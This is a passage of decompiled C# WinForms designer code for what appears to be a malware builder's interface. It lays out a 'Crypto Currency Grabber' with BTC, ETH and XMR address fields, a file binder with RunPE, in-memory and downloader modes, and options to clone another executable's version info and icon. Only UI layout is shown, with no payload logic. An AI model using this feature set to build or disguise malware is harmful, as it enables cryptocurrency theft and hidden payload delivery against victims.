		PictureBox70.Image = (Image)componentResourceManager.GetObject("PictureBox70.Image");
		PictureBox70.Location = new Point(373, 3);
		PictureBox70.Name = "PictureBox70";
		PictureBox70.Size = new Size(48, 30);
		PictureBox70.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox70.TabIndex = 114;
		PictureBox70.TabStop = false;
		ETH.Animated = true;
		ETH.AutoRoundedCorners = true;
		ETH.BackColor = Color.FromArgb(24, 30, 54);
		ETH.BorderColor = Color.FromArgb(0, 126, 249);
		ETH.BorderRadius = 13;
		ETH.BorderStyle = DashStyle.Custom;
		ETH.Cursor = Cursors.IBeam;
		ETH.DefaultText = "";
		ETH.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		ETH.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		ETH.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		ETH.DisabledState.Parent = ETH;
		ETH.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		ETH.Enabled = false;
		ETH.FillColor = Color.FromArgb(24, 30, 54);
		ETH.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		ETH.FocusedState.Parent = ETH;
		ETH.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		ETH.ForeColor = Color.White;
		ETH.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		ETH.HoverState.Parent = ETH;
		ETH.IconLeft = (Image)componentResourceManager.GetObject("ETH.IconLeft");
		ETH.Location = new Point(10, 92);
		ETH.Margin = new Padding(3, 2, 3, 2);
		ETH.Name = "ETH";
		ETH.PasswordChar = '\0';
		ETH.PlaceholderForeColor = Color.Gray;
		ETH.PlaceholderText = "ETH Address";
		ETH.SelectedText = "";
		ETH.ShadowDecoration.Parent = ETH;
		ETH.Size = new Size(399, 29);
		ETH.Style = TextBoxStyle.Material;
		ETH.TabIndex = 32;
		ETH.TextAlign = HorizontalAlignment.Center;
		GXMR.Animated = true;
		GXMR.AutoRoundedCorners = true;
		GXMR.BackColor = Color.FromArgb(24, 30, 54);
		GXMR.BorderColor = Color.FromArgb(0, 126, 249);
		GXMR.BorderRadius = 13;
		GXMR.BorderStyle = DashStyle.Custom;
		GXMR.Cursor = Cursors.IBeam;
		GXMR.DefaultText = "";
		GXMR.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		GXMR.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		GXMR.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		GXMR.DisabledState.Parent = GXMR;
		GXMR.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		GXMR.Enabled = false;
		GXMR.FillColor = Color.FromArgb(24, 30, 54);
		GXMR.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		GXMR.FocusedState.Parent = GXMR;
		GXMR.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		GXMR.ForeColor = Color.White;
		GXMR.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		GXMR.HoverState.Parent = GXMR;
		GXMR.IconLeft = (Image)componentResourceManager.GetObject("GXMR.IconLeft");
		GXMR.Location = new Point(10, 136);
		GXMR.Margin = new Padding(3, 2, 3, 2);
		GXMR.Name = "GXMR";
		GXMR.PasswordChar = '\0';
		GXMR.PlaceholderForeColor = Color.Gray;
		GXMR.PlaceholderText = "XMR Address";
		GXMR.SelectedText = "";
		GXMR.ShadowDecoration.Parent = GXMR;
		GXMR.Size = new Size(399, 29);
		GXMR.Style = TextBoxStyle.Material;
		GXMR.TabIndex = 35;
		GXMR.TextAlign = HorizontalAlignment.Center;
		Label85.AutoSize = true;
		Label85.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label85.ForeColor = Color.White;
		Label85.Location = new Point(53, 11);
		Label85.Name = "Label85";
		Label85.Size = new Size(146, 14);
		Label85.TabIndex = 199;
		Label85.Text = "Crypto Currency Grabber";
		BTC.Animated = true;
		BTC.AutoRoundedCorners = true;
		BTC.BackColor = Color.FromArgb(24, 30, 54);
		BTC.BorderColor = Color.FromArgb(0, 126, 249);
		BTC.BorderRadius = 13;
		BTC.BorderStyle = DashStyle.Custom;
		BTC.Cursor = Cursors.IBeam;
		BTC.DefaultText = "";
		BTC.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		BTC.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		BTC.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		BTC.DisabledState.Parent = BTC;
		BTC.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		BTC.Enabled = false;
		BTC.FillColor = Color.FromArgb(24, 30, 54);
		BTC.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		BTC.FocusedState.Parent = BTC;
		BTC.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		BTC.ForeColor = Color.White;
		BTC.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		BTC.HoverState.Parent = BTC;
		BTC.IconLeft = (Image)componentResourceManager.GetObject("BTC.IconLeft");
		BTC.Location = new Point(10, 49);
		BTC.Margin = new Padding(3, 2, 3, 2);
		BTC.Name = "BTC";
		BTC.PasswordChar = '\0';
		BTC.PlaceholderForeColor = Color.Gray;
		BTC.PlaceholderText = "BTC Address";
		BTC.SelectedText = "";
		BTC.ShadowDecoration.Parent = BTC;
		BTC.Size = new Size(399, 29);
		BTC.Style = TextBoxStyle.Material;
		BTC.TabIndex = 37;
		BTC.TextAlign = HorizontalAlignment.Center;
		Grabber.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Grabber.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Grabber.CheckedState.InnerBorderColor = Color.White;
		Grabber.CheckedState.InnerColor = Color.White;
		Grabber.CheckedState.Parent = Grabber;
		Grabber.Location = new Point(10, 9);
		Grabber.Name = "Grabber";
		Grabber.ShadowDecoration.Parent = Grabber;
		Grabber.Size = new Size(35, 20);
		Grabber.TabIndex = 198;
		Grabber.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Grabber.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Grabber.UncheckedState.InnerBorderColor = Color.White;
		Grabber.UncheckedState.InnerColor = Color.White;
		Grabber.UncheckedState.Parent = Grabber;
		TabPage8.BackColor = Color.FromArgb(46, 51, 73);
		TabPage8.Controls.Add(Panel31);
		TabPage8.Location = new Point(4, 22);
		TabPage8.Name = "TabPage8";
		TabPage8.Size = new Size(894, 398);
		TabPage8.TabIndex = 7;
		TabPage8.Text = "Binder";
		Panel31.BackColor = Color.FromArgb(46, 51, 73);
		Panel31.Controls.Add(Guna2GradientPanel8);
		Panel31.Dock = DockStyle.Fill;
		Panel31.ForeColor = Color.Transparent;
		Panel31.Location = new Point(0, 0);
		Panel31.Name = "Panel31";
		Panel31.Size = new Size(894, 398);
		Panel31.TabIndex = 66;
		Guna2GradientPanel8.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel8.Controls.Add(Binder_ComboBox1);
		Guna2GradientPanel8.Controls.Add(PictureBox76);
		Guna2GradientPanel8.Controls.Add(Binder_Run);
		Guna2GradientPanel8.Controls.Add(Label82);
		Guna2GradientPanel8.Controls.Add(Loading);
		Guna2GradientPanel8.Controls.Add(RunPE);
		Guna2GradientPanel8.Controls.Add(PictureBox71);
		Guna2GradientPanel8.Controls.Add(Label81);
		Guna2GradientPanel8.Controls.Add(Binder_Path);
		Guna2GradientPanel8.Controls.Add(Enable_Binder);
		Guna2GradientPanel8.Location = new Point(174, 91);
		Guna2GradientPanel8.Name = "Guna2GradientPanel8";
		Guna2GradientPanel8.ShadowDecoration.Parent = Guna2GradientPanel8;
		Guna2GradientPanel8.Size = new Size(570, 227);
		Guna2GradientPanel8.TabIndex = 116;
		Binder_ComboBox1.Animated = true;
		Binder_ComboBox1.AutoRoundedCorners = true;
		Binder_ComboBox1.BackColor = Color.FromArgb(0, 192, 192);
		Binder_ComboBox1.BorderColor = Color.FromArgb(0, 126, 249);
		Binder_ComboBox1.BorderRadius = 17;
		Binder_ComboBox1.DrawMode = DrawMode.OwnerDrawFixed;
		Binder_ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
		Binder_ComboBox1.Enabled = false;
		Binder_ComboBox1.FillColor = Color.FromArgb(24, 30, 54);
		Binder_ComboBox1.FocusedColor = Color.FromArgb(94, 148, 255);
		Binder_ComboBox1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Binder_ComboBox1.FocusedState.Parent = Binder_ComboBox1;
		Binder_ComboBox1.Font = new Font("Segoe UI", 9f);
		Binder_ComboBox1.ForeColor = Color.FromArgb(224, 224, 224);
		Binder_ComboBox1.HoverState.Parent = Binder_ComboBox1;
		Binder_ComboBox1.ItemHeight = 30;
		Binder_ComboBox1.Items.AddRange(new object[2] { "Normal", "Downloader" });
		Binder_ComboBox1.ItemsAppearance.Parent = Binder_ComboBox1;
		Binder_ComboBox1.Location = new Point(10, 51);
		Binder_ComboBox1.Name = "Binder_ComboBox1";
		Binder_ComboBox1.ShadowDecoration.Parent = Binder_ComboBox1;
		Binder_ComboBox1.Size = new Size(198, 36);
		Binder_ComboBox1.Style = TextBoxStyle.Material;
		Binder_ComboBox1.TabIndex = 209;
		PictureBox76.Image = (Image)componentResourceManager.GetObject("PictureBox76.Image");
		PictureBox76.Location = new Point(10, 176);
		PictureBox76.Name = "PictureBox76";
		PictureBox76.Size = new Size(48, 30);
		PictureBox76.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox76.TabIndex = 208;
		PictureBox76.TabStop = false;
		Binder_Run.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Binder_Run.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Binder_Run.CheckedState.InnerBorderColor = Color.White;
		Binder_Run.CheckedState.InnerColor = Color.White;
		Binder_Run.CheckedState.Parent = Binder_Run;
		Binder_Run.Enabled = false;
		Binder_Run.Location = new Point(66, 182);
		Binder_Run.Name = "Binder_Run";
		Binder_Run.ShadowDecoration.Parent = Binder_Run;
		Binder_Run.Size = new Size(35, 20);
		Binder_Run.TabIndex = 206;
		Binder_Run.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Binder_Run.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Binder_Run.UncheckedState.InnerBorderColor = Color.White;
		Binder_Run.UncheckedState.InnerColor = Color.White;
		Binder_Run.UncheckedState.Parent = Binder_Run;
		Label82.AutoSize = true;
		Label82.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label82.ForeColor = Color.White;
		Label82.Location = new Point(107, 183);
		Label82.Name = "Label82";
		Label82.Size = new Size(81, 14);
		Label82.TabIndex = 207;
		Label82.Text = "Run File Once";
		Loading.AutoSize = true;
		Loading.Enabled = false;
		Loading.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Loading.Location = new Point(93, 102);
		Loading.Name = "Loading";
		Loading.Size = new Size(71, 18);
		Loading.TabIndex = 202;
		Loading.Text = "Memory";
		Loading.UseVisualStyleBackColor = true;
		RunPE.AutoSize = true;
		RunPE.Checked = true;
		RunPE.Enabled = false;
		RunPE.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		RunPE.Location = new Point(10, 102);
		RunPE.Name = "RunPE";
		RunPE.Size = new Size(64, 18);
		RunPE.TabIndex = 201;
		RunPE.TabStop = true;
		RunPE.Text = "Normal";
		RunPE.UseVisualStyleBackColor = true;
		PictureBox71.Image = (Image)componentResourceManager.GetObject("PictureBox71.Image");
		PictureBox71.Location = new Point(519, 3);
		PictureBox71.Name = "PictureBox71";
		PictureBox71.Size = new Size(48, 30);
		PictureBox71.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox71.TabIndex = 114;
		PictureBox71.TabStop = false;
		Label81.AutoSize = true;
		Label81.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label81.ForeColor = Color.White;
		Label81.Location = new Point(53, 11);
		Label81.Name = "Label81";
		Label81.Size = new Size(82, 14);
		Label81.TabIndex = 199;
		Label81.Text = "Enable Binder";
		Binder_Path.Animated = true;
		Binder_Path.AutoRoundedCorners = true;
		Binder_Path.BackColor = Color.FromArgb(24, 30, 54);
		Binder_Path.BorderColor = Color.FromArgb(0, 126, 249);
		Binder_Path.BorderRadius = 13;
		Binder_Path.BorderStyle = DashStyle.Custom;
		Binder_Path.Cursor = Cursors.IBeam;
		Binder_Path.DefaultText = "";
		Binder_Path.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Binder_Path.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Binder_Path.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Binder_Path.DisabledState.Parent = Binder_Path;
		Binder_Path.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Binder_Path.Enabled = false;
		Binder_Path.FillColor = Color.FromArgb(24, 30, 54);
		Binder_Path.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Binder_Path.FocusedState.Parent = Binder_Path;
		Binder_Path.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Binder_Path.ForeColor = Color.White;
		Binder_Path.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Binder_Path.HoverState.Parent = Binder_Path;
		Binder_Path.IconLeft = (Image)componentResourceManager.GetObject("Binder_Path.IconLeft");
		Binder_Path.IconLeftCursor = Cursors.Hand;
		Binder_Path.IconRight = (Image)componentResourceManager.GetObject("Binder_Path.IconRight");
		Binder_Path.IconRightCursor = Cursors.Hand;
		Binder_Path.Location = new Point(10, 125);
		Binder_Path.Margin = new Padding(3, 2, 3, 2);
		Binder_Path.Name = "Binder_Path";
		Binder_Path.PasswordChar = '\0';
		Binder_Path.PlaceholderForeColor = Color.Gray;
		Binder_Path.PlaceholderText = "Path";
		Binder_Path.ReadOnly = true;
		Binder_Path.SelectedText = "";
		Binder_Path.ShadowDecoration.Parent = Binder_Path;
		Binder_Path.Size = new Size(533, 29);
		Binder_Path.Style = TextBoxStyle.Material;
		Binder_Path.TabIndex = 37;
		Binder_Path.TextAlign = HorizontalAlignment.Center;
		Enable_Binder.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Enable_Binder.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Enable_Binder.CheckedState.InnerBorderColor = Color.White;
		Enable_Binder.CheckedState.InnerColor = Color.White;
		Enable_Binder.CheckedState.Parent = Enable_Binder;
		Enable_Binder.Location = new Point(10, 9);
		Enable_Binder.Name = "Enable_Binder";
		Enable_Binder.ShadowDecoration.Parent = Enable_Binder;
		Enable_Binder.Size = new Size(35, 20);
		Enable_Binder.TabIndex = 198;
		Enable_Binder.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Enable_Binder.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Enable_Binder.UncheckedState.InnerBorderColor = Color.White;
		Enable_Binder.UncheckedState.InnerColor = Color.White;
		Enable_Binder.UncheckedState.Parent = Enable_Binder;
		TabPage9.BackColor = Color.FromArgb(46, 51, 73);
		TabPage9.Controls.Add(Panel34);
		TabPage9.ForeColor = Color.FromArgb(46, 51, 73);
		TabPage9.Location = new Point(4, 22);
		TabPage9.Name = "TabPage9";
		TabPage9.Padding = new Padding(3);
		TabPage9.Size = new Size(894, 398);
		TabPage9.TabIndex = 8;
		TabPage9.Text = "Assmply";
		Panel34.BackColor = Color.FromArgb(46, 51, 73);
		Panel34.Controls.Add(Guna2GradientPanel13);
		Panel34.Controls.Add(Guna2GradientPanel12);
		Panel34.Dock = DockStyle.Fill;
		Panel34.ForeColor = Color.Transparent;
		Panel34.Location = new Point(3, 3);
		Panel34.Name = "Panel34";
		Panel34.Size = new Size(888, 392);
		Panel34.TabIndex = 66;
		Guna2GradientPanel13.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel13.Controls.Add(Path_icon);
		Guna2GradientPanel13.Controls.Add(PictureBox_icon);
		Guna2GradientPanel13.Controls.Add(Add_icon);
		Guna2GradientPanel13.Controls.Add(Label84);
		Guna2GradientPanel13.Controls.Add(Enable_icon);
		Guna2GradientPanel13.Location = new Point(446, 17);
		Guna2GradientPanel13.Name = "Guna2GradientPanel13";
		Guna2GradientPanel13.ShadowDecoration.Parent = Guna2GradientPanel13;
		Guna2GradientPanel13.Size = new Size(412, 349);
		Guna2GradientPanel13.TabIndex = 118;
		Path_icon.Animated = true;
		Path_icon.AutoRoundedCorners = true;
		Path_icon.BackColor = Color.FromArgb(24, 30, 54);
		Path_icon.BorderColor = Color.FromArgb(0, 126, 249);
		Path_icon.BorderRadius = 13;
		Path_icon.BorderStyle = DashStyle.Custom;
		Path_icon.Cursor = Cursors.IBeam;
		Path_icon.DefaultText = "";
		Path_icon.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Path_icon.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Path_icon.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Path_icon.DisabledState.Parent = Path_icon;
		Path_icon.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Path_icon.Enabled = false;
		Path_icon.FillColor = Color.FromArgb(24, 30, 54);
		Path_icon.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Path_icon.FocusedState.Parent = Path_icon;
		Path_icon.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Path_icon.ForeColor = Color.White;
		Path_icon.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Path_icon.HoverState.Parent = Path_icon;
		Path_icon.Location = new Point(10, 207);
		Path_icon.Margin = new Padding(3, 2, 3, 2);
		Path_icon.Name = "Path_icon";
		Path_icon.PasswordChar = '\0';
		Path_icon.PlaceholderForeColor = Color.Gray;
		Path_icon.PlaceholderText = "";
		Path_icon.ReadOnly = true;
		Path_icon.SelectedText = "";
		Path_icon.ShadowDecoration.Parent = Path_icon;
		Path_icon.Size = new Size(388, 29);
		Path_icon.Style = TextBoxStyle.Material;
		Path_icon.TabIndex = 207;
		Path_icon.TextAlign = HorizontalAlignment.Center;
		PictureBox_icon.Image = (Image)componentResourceManager.GetObject("PictureBox_icon.Image");
		PictureBox_icon.Location = new Point(140, 84);
		PictureBox_icon.Name = "PictureBox_icon";
		PictureBox_icon.Size = new Size(113, 76);
		PictureBox_icon.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox_icon.TabIndex = 206;
		PictureBox_icon.TabStop = false;
		Add_icon.CheckedState.Parent = Add_icon;
		Add_icon.CustomImages.Parent = Add_icon;
		Add_icon.Enabled = false;
		Add_icon.Font = new Font("Segoe UI", 9f);
		Add_icon.ForeColor = Color.White;
		Add_icon.HoverState.Parent = Add_icon;
		Add_icon.Location = new Point(10, 267);
		Add_icon.Name = "Add_icon";
		Add_icon.ShadowDecoration.Parent = Add_icon;
		Add_icon.Size = new Size(392, 60);
		Add_icon.TabIndex = 204;
		Add_icon.Text = "Icon";
		Label84.AutoSize = true;
		Label84.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label84.ForeColor = Color.White;
		Label84.Location = new Point(53, 11);
		Label84.Name = "Label84";
		Label84.Size = new Size(69, 14);
		Label84.TabIndex = 199;
		Label84.Text = "Enable Icon";
		Enable_icon.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Enable_icon.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Enable_icon.CheckedState.InnerBorderColor = Color.White;
		Enable_icon.CheckedState.InnerColor = Color.White;
		Enable_icon.CheckedState.Parent = Enable_icon;
		Enable_icon.Location = new Point(10, 9);
		Enable_icon.Name = "Enable_icon";
		Enable_icon.ShadowDecoration.Parent = Enable_icon;
		Enable_icon.Size = new Size(35, 20);
		Enable_icon.TabIndex = 198;
		Enable_icon.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Enable_icon.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Enable_icon.UncheckedState.InnerBorderColor = Color.White;
		Enable_icon.UncheckedState.InnerColor = Color.White;
		Enable_icon.UncheckedState.Parent = Enable_icon;
		Guna2GradientPanel12.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel12.Controls.Add(num4);
		Guna2GradientPanel12.Controls.Add(num3);
		Guna2GradientPanel12.Controls.Add(Label41);
		Guna2GradientPanel12.Controls.Add(num2);
		Guna2GradientPanel12.Controls.Add(num1);
		Guna2GradientPanel12.Controls.Add(GeRan);
		Guna2GradientPanel12.Controls.Add(Clone_F);
		Guna2GradientPanel12.Controls.Add(As5);
		Guna2GradientPanel12.Controls.Add(As4);
		Guna2GradientPanel12.Controls.Add(As3);
		Guna2GradientPanel12.Controls.Add(As2);
		Guna2GradientPanel12.Controls.Add(Label88);
		Guna2GradientPanel12.Controls.Add(As1);
		Guna2GradientPanel12.Controls.Add(Guna2ToggleSwitch2);
		Guna2GradientPanel12.Location = new Point(26, 17);
		Guna2GradientPanel12.Name = "Guna2GradientPanel12";
		Guna2GradientPanel12.ShadowDecoration.Parent = Guna2GradientPanel12;
		Guna2GradientPanel12.Size = new Size(412, 349);
		Guna2GradientPanel12.TabIndex = 117;
		num4.BackColor = Color.FromArgb(37, 42, 64);
		num4.Enabled = false;
		num4.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		num4.ForeColor = Color.White;
		num4.Location = new Point(297, 279);
		num4.Maximum = new decimal(new int[4] { 9999999, 0, 0, 0 });
		num4.Name = "num4";
		num4.Size = new Size(86, 23);
		num4.TabIndex = 220;
		num3.BackColor = Color.FromArgb(37, 42, 64);
		num3.Enabled = false;
		num3.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		num3.ForeColor = Color.White;
		num3.Location = new Point(205, 279);
		num3.Maximum = new decimal(new int[4] { 9999999, 0, 0, 0 });
		num3.Name = "num3";
		num3.Size = new Size(86, 23);
		num3.TabIndex = 219;
		Label41.AutoSize = true;
		Label41.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label41.ForeColor = Color.White;
		Label41.Location = new Point(17, 258);
		Label41.Name = "Label41";
		Label41.Size = new Size(77, 14);
		Label41.TabIndex = 218;
		Label41.Text = "File version :";
		num2.BackColor = Color.FromArgb(37, 42, 64);
		num2.Enabled = false;
		num2.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		num2.ForeColor = Color.White;
		num2.Location = new Point(113, 279);
		num2.Maximum = new decimal(new int[4] { 9999999, 0, 0, 0 });
		num2.Name = "num2";
		num2.Size = new Size(86, 23);
		num2.TabIndex = 215;
		num1.BackColor = Color.FromArgb(37, 42, 64);
		num1.Enabled = false;
		num1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		num1.ForeColor = Color.White;
		num1.Location = new Point(21, 279);
		num1.Maximum = new decimal(new int[4] { 9999999, 0, 0, 0 });
		num1.Name = "num1";
		num1.Size = new Size(86, 23);
		num1.TabIndex = 214;
		num1.Value = new decimal(new int[4] { 1, 0, 0, 0 });
		GeRan.CheckedState.Parent = GeRan;
		GeRan.CustomImages.Parent = GeRan;
		GeRan.Enabled = false;
		GeRan.Font = new Font("Segoe UI", 9f);
		GeRan.ForeColor = Color.White;
		GeRan.HoverState.Parent = GeRan;
		GeRan.Location = new Point(20, 313);
		GeRan.Name = "GeRan";
		GeRan.ShadowDecoration.Parent = GeRan;
		GeRan.Size = new Size(367, 29);
		GeRan.TabIndex = 205;
		GeRan.Text = "Random Generator";
		Clone_F.CheckedState.Parent = Clone_F;
		Clone_F.CustomImages.Parent = Clone_F;
		Clone_F.Enabled = false;
		Clone_F.Font = new Font("Segoe UI", 9f);
		Clone_F.ForeColor = Color.White;
		Clone_F.HoverState.Parent = Clone_F;
		Clone_F.Location = new Point(20, 53);
		Clone_F.Name = "Clone_F";
		Clone_F.ShadowDecoration.Parent = Clone_F;
		Clone_F.Size = new Size(367, 29);
		Clone_F.TabIndex = 204;
		Clone_F.Text = "Clone from (*exe)";
		As5.Animated = true;
		As5.AutoRoundedCorners = true;
		As5.BackColor = Color.FromArgb(24, 30, 54);
		As5.BorderColor = Color.FromArgb(0, 126, 249);
		As5.BorderRadius = 13;
		As5.BorderStyle = DashStyle.Custom;
		As5.Cursor = Cursors.IBeam;
		As5.DefaultText = "";
		As5.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		As5.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		As5.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		As5.DisabledState.Parent = As5;
		As5.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		As5.Enabled = false;
		As5.FillColor = Color.FromArgb(24, 30, 54);
		As5.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		As5.FocusedState.Parent = As5;
		As5.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		As5.ForeColor = Color.White;
		As5.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		As5.HoverState.Parent = As5;
		As5.Location = new Point(20, 223);
		As5.Margin = new Padding(3, 2, 3, 2);
		As5.Name = "As5";
		As5.PasswordChar = '\0';
		As5.PlaceholderForeColor = Color.Gray;
		As5.PlaceholderText = "Copyright";
		As5.SelectedText = "";
		As5.ShadowDecoration.Parent = As5;
		As5.Size = new Size(367, 29);
		As5.Style = TextBoxStyle.Material;
		As5.TabIndex = 203;
		As5.TextAlign = HorizontalAlignment.Center;
		As4.Animated = true;
		As4.AutoRoundedCorners = true;
		As4.BackColor = Color.FromArgb(24, 30, 54);
		As4.BorderColor = Color.FromArgb(0, 126, 249);
		As4.BorderRadius = 13;
		As4.BorderStyle = DashStyle.Custom;
		As4.Cursor = Cursors.IBeam;
		As4.DefaultText = "";
		As4.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		As4.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		As4.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		As4.DisabledState.Parent = As4;
		As4.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		As4.Enabled = false;
		As4.FillColor = Color.FromArgb(24, 30, 54);
		As4.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		As4.FocusedState.Parent = As4;
		As4.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		As4.ForeColor = Color.White;
		As4.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		As4.HoverState.Parent = As4;
		As4.Location = new Point(20, 190);
		As4.Margin = new Padding(3, 2, 3, 2);
		As4.Name = "As4";
		As4.PasswordChar = '\0';
		As4.PlaceholderForeColor = Color.Gray;
		As4.PlaceholderText = "Product";
		As4.SelectedText = "";
		As4.ShadowDecoration.Parent = As4;
		As4.Size = new Size(367, 29);
		As4.Style = TextBoxStyle.Material;
		As4.TabIndex = 202;
		As4.TextAlign = HorizontalAlignment.Center;
		As3.Animated = true;
		As3.AutoRoundedCorners = true;
		As3.BackColor = Color.FromArgb(24, 30, 54);
		As3.BorderColor = Color.FromArgb(0, 126, 249);
		As3.BorderRadius = 13;
		As3.BorderStyle = DashStyle.Custom;
		As3.Cursor = Cursors.IBeam;
		As3.DefaultText = "";
		As3.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		As3.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		As3.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		As3.DisabledState.Parent = As3;
		As3.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		As3.Enabled = false;
		As3.FillColor = Color.FromArgb(24, 30, 54);
		As3.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		As3.FocusedState.Parent = As3;
		As3.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		As3.ForeColor = Color.White;
		As3.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		As3.HoverState.Parent = As3;
		As3.Location = new Point(20, 157);
		As3.Margin = new Padding(3, 2, 3, 2);
		As3.Name = "As3";
		As3.PasswordChar = '\0';
		As3.PlaceholderForeColor = Color.Gray;
		As3.PlaceholderText = "Company";
		As3.SelectedText = "";
		As3.ShadowDecoration.Parent = As3;
		As3.Size = new Size(367, 29);
		As3.Style = TextBoxStyle.Material;
		As3.TabIndex = 201;
		As3.TextAlign = HorizontalAlignment.Center;
		As2.Animated = true;
		As2.AutoRoundedCorners = true;
		As2.BackColor = Color.FromArgb(24, 30, 54);
		As2.BorderColor = Color.FromArgb(0, 126, 249);
		As2.BorderRadius = 13;
		As2.BorderStyle = DashStyle.Custom;
		As2.Cursor = Cursors.IBeam;
		As2.DefaultText = "";
		As2.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		As2.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		As2.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		As2.DisabledState.Parent = As2;
		As2.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		As2.Enabled = false;
		As2.FillColor = Color.FromArgb(24, 30, 54);
		As2.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		As2.FocusedState.Parent = As2;
		As2.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		As2.ForeColor = Color.White;
		As2.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		As2.HoverState.Parent = As2;
		As2.Location = new Point(20, 124);
		As2.Margin = new Padding(3, 2, 3, 2);
		As2.Name = "As2";
		As2.PasswordChar = '\0';
		As2.PlaceholderForeColor = Color.Gray;
		As2.PlaceholderText = "Description";
		As2.SelectedText = "";
		As2.ShadowDecoration.Parent = As2;
		As2.Size = new Size(367, 29);
		As2.Style = TextBoxStyle.Material;
		As2.TabIndex = 200;
		As2.TextAlign = HorizontalAlignment.Center;
		Label88.AutoSize = true;
